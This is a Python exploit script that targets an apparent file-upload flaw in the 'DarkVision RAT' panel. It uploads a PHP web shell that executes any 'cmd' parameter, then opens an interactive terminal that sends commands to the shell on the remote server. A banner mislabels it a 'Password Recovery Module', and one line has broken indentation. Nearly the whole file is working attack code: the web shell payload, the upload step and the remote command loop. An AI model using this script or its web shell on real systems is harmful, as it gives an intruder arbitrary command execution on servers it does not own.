import requests
import random
import string
import os

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def upload_shell(url, hwid, logfoldername, shell_content):
    shell_file_name = "shell.php"
    with open(shell_file_name, "w") as f:
        f.write(shell_content)

    data = {
        "hwid": hwid,
        "logfoldername": logfoldername,
    }
    files = {
        "uploaded_file": (shell_file_name, open(shell_file_name, "rb"), "application/x-php"),
    }

    response = requests.post(url, data=data, files=files)
    return response

def fancy_terminal(shell_url):
    os.system("clear")
    print("╔═════════════════════════════════════════════════════════════╗")
    print("║               DarkVision RAT Vuln - Terminal                ║")
    print("╚═════════════════════════════════════════════════════════════╝")
    print("\nType commands as you would in a normal terminal.")
    print("Type 'exit' to quit.\n")

    while True:
        try:
            cmd = input("darkvision-vuln@remote $ ").strip()
            if cmd.lower() in ["exit", "quit"]:
                print("\nGoodbye!")
                break

            response = requests.get(shell_url, params={"cmd": cmd})
            if response.status_code == 200:
                output = response.text.strip()
                if output:
                    print(output)
                else:
                    print("[!] Command executed successfully, but no output was returned.")
            else:
                print(f"[!] Error: HTTP {response.status_code}")
        except KeyboardInterrupt:
            print("\nSession interrupted. Goodbye!")
            break
        except Exception as e:
            print(f"[!] An error occurred: {e}")

def main():

print("╔═════════════════════════════════════════════════════════════╗")
    print("║         DarkVision RAT Vuln - Password Recovery Module      ║")
    print("╚═════════════════════════════════════════════════════════════╝")

    url = input("[?] Enter the URL of upload.php (e.g., http://127.0.0.1/upload.php): ").strip()

    hwid = generate_random_string()
    logfoldername = generate_random_string()

    shell_content = """
    <?php
    if (isset($_GET['cmd'])) {
        $cmd = $_GET['cmd'];
        $output = [];
        $return_var = 0;

        exec("$cmd 2>&1", $output, $return_var);

        header('Content-Type: text/plain');
        echo implode("\\n", $output);
        exit($return_var);
    }
    ?>
    """

    print("\n[*] Uploading the shell...")
    response = upload_shell(url, hwid, logfoldername, shell_content)

    if response.status_code == 200:
        print("[+] Shell uploaded successfully!")
        print("[+] Server Response:", response.text)

        shell_url = f"{url.replace('upload.php', '')}uploads/{hwid}/{logfoldername}/shell.php"
        print(f"[+] Shell URL: {shell_url}")
        
        fancy_terminal(shell_url)
    else:
        print("[-] Failed to upload the shell!")
        print("[-] Server Response:", response.text)

if __name__ == "__main__":
    main()